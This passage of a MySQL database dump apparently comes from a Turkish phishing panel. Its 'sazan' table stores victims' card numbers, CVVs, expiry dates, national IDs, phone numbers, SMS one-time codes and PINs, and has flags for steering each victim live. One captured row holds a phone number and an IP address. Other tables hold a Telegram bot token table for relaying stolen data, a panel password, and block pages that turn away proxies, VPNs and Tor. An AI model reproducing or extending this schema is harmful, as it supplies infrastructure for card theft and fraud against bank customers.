  `longitude` varchar(30) NOT NULL DEFAULT '0',
  `isp` varchar(255) NOT NULL DEFAULT 'Unknown',
  `useragent` text NOT NULL,
  `referer_url` varchar(255) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `psec_logs`
--

LOCK TABLES `psec_logs` WRITE;
/*!40000 ALTER TABLE `psec_logs` DISABLE KEYS */;
/*!40000 ALTER TABLE `psec_logs` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `psec_pages-layolt`
--

DROP TABLE IF EXISTS `psec_pages-layolt`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `psec_pages-layolt` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `page` varchar(30) NOT NULL,
  `text` text NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=10 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `psec_pages-layolt`
--

LOCK TABLES `psec_pages-layolt` WRITE;
/*!40000 ALTER TABLE `psec_pages-layolt` DISABLE KEYS */;
INSERT INTO `psec_pages-layolt` VALUES (1,'Banned','You are banned and you cannot continue to the website'),(2,'Blocked','Malicious request was detected'),(3,'Proxy','Access to the website via Proxy, VPN, TOR is not allowed (Disable Browser Data Compression if you have it enabled)'),(4,'Spam','You are in the Blacklist of Spammers and you cannot continue to the website'),(5,'Banned_Country','Sorry, but your country is banned and you cannot continue to the website'),(6,'Blocked_Browser','Access to the website through your Browser is not allowed, please use another Internet Browser'),(7,'Blocked_OS','Access to the website through your Operating System is not allowed'),(8,'Blocked_ISP','Your Internet Service Provider is blacklisted and you cannot continue to the website'),(9,'Blocked_RFR','Your referrer url is blocked and you cannot continue to the website');
/*!40000 ALTER TABLE `psec_pages-layolt` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `sazan`
--

DROP TABLE IF EXISTS `sazan`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `sazan` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `date` varchar(255) NOT NULL,
  `kk` varchar(255) DEFAULT NULL,
  `ccmonth` varchar(255) DEFAULT NULL,
  `ay` varchar(255) DEFAULT NULL,
  `yil` varchar(255) DEFAULT NULL,
  `sonkul` varchar(255) DEFAULT NULL,
  `cvv` varchar(255) DEFAULT NULL,
  `ad` varchar(255) DEFAULT NULL,
  `phone` varchar(255) DEFAULT NULL,
  `money` varchar(255) DEFAULT NULL,
  `sms` varchar(255) DEFAULT NULL,
  `sms2` varchar(255) CHARACTER SET utf8mb3 COLLATE utf8mb3_turkish_ci DEFAULT NULL,
  `pin` varchar(255) DEFAULT NULL,
  `now` varchar(255) CHARACTER SET utf8mb3 COLLATE utf8mb3_turkish_ci NOT NULL DEFAULT 'Anasayfada',
  `sound` int(11) NOT NULL DEFAULT 1,
  `back` int(11) NOT NULL DEFAULT 0,
  `go` int(11) NOT NULL DEFAULT 0,
  `ip` varchar(255) NOT NULL,
  `lastOnline` bigint(20) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=19 DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `sazan`
--

LOCK TABLES `sazan` WRITE;
/*!40000 ALTER TABLE `sazan` DISABLE KEYS */;
INSERT INTO `sazan` VALUES (18,'11.03.2025 20:28','3333333333333333',NULL,'11/11',NULL,NULL,'333','13598833370','+905301002050','846486',NULL,NULL,NULL,'hatali sms',1,0,0,'91.140.30.204',1741718309);
/*!40000 ALTER TABLE `sazan` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `site`
--

DROP TABLE IF EXISTS `site`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `site` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `pass` text NOT NULL,
  `privpage` text CHARACTER SET utf8mb3 COLLATE utf8mb3_turkish_ci NOT NULL,
  `refresh` int(11) NOT NULL DEFAULT 5,
  `sound` int(11) NOT NULL DEFAULT 0,
  `go` int(11) NOT NULL DEFAULT 0,
  `3d` int(11) NOT NULL DEFAULT 0,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `site`
--

LOCK TABLES `site` WRITE;
/*!40000 ALTER TABLE `site` DISABLE KEYS */;
INSERT INTO `site` VALUES (1,'10030','chante#404',10,0,0,0);
/*!40000 ALTER TABLE `site` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `sms`
--

DROP TABLE IF EXISTS `sms`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `sms` (
  `sms` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `sms`
--

LOCK TABLES `sms` WRITE;
/*!40000 ALTER TABLE `sms` DISABLE KEYS */;
INSERT INTO `sms` VALUES ('14'),('undefined');
/*!40000 ALTER TABLE `sms` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `sms2`
--

DROP TABLE IF EXISTS `sms2`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `sms2` (
  `sms2` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `sms2`
--

LOCK TABLES `sms2` WRITE;
/*!40000 ALTER TABLE `sms2` DISABLE KEYS */;
INSERT INTO `sms2` VALUES ('14'),('undefined');
/*!40000 ALTER TABLE `sms2` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `tebrik`
--

DROP TABLE IF EXISTS `tebrik`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `tebrik` (
  `tebrik` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `tebrik`
--

LOCK TABLES `tebrik` WRITE;
/*!40000 ALTER TABLE `tebrik` DISABLE KEYS */;
/*!40000 ALTER TABLE `tebrik` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `telegram_bots`
--

DROP TABLE IF EXISTS `telegram_bots`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `telegram_bots` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `bot_token` varchar(255) NOT NULL,
  `chat_id` varchar(255) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=3 DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `telegram_bots`
--

LOCK TABLES `telegram_bots` WRITE;
/*!40000 ALTER TABLE `telegram_bots` DISABLE KEYS */;
INSERT INTO `telegram_bots` VALUES (1,'1','2');
/*!40000 ALTER TABLE `telegram_bots` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `telhata`
--

DROP TABLE IF EXISTS `telhata`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `telhata` (
  `telhata` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `telhata`
--

LOCK TABLES `telhata` WRITE;
/*!40000 ALTER TABLE `telhata` DISABLE KEYS */;
/*!40000 ALTER TABLE `telhata` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Dumping routines for database 'g4rnt_m0bl'
--
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2025-03-11 20:09:27
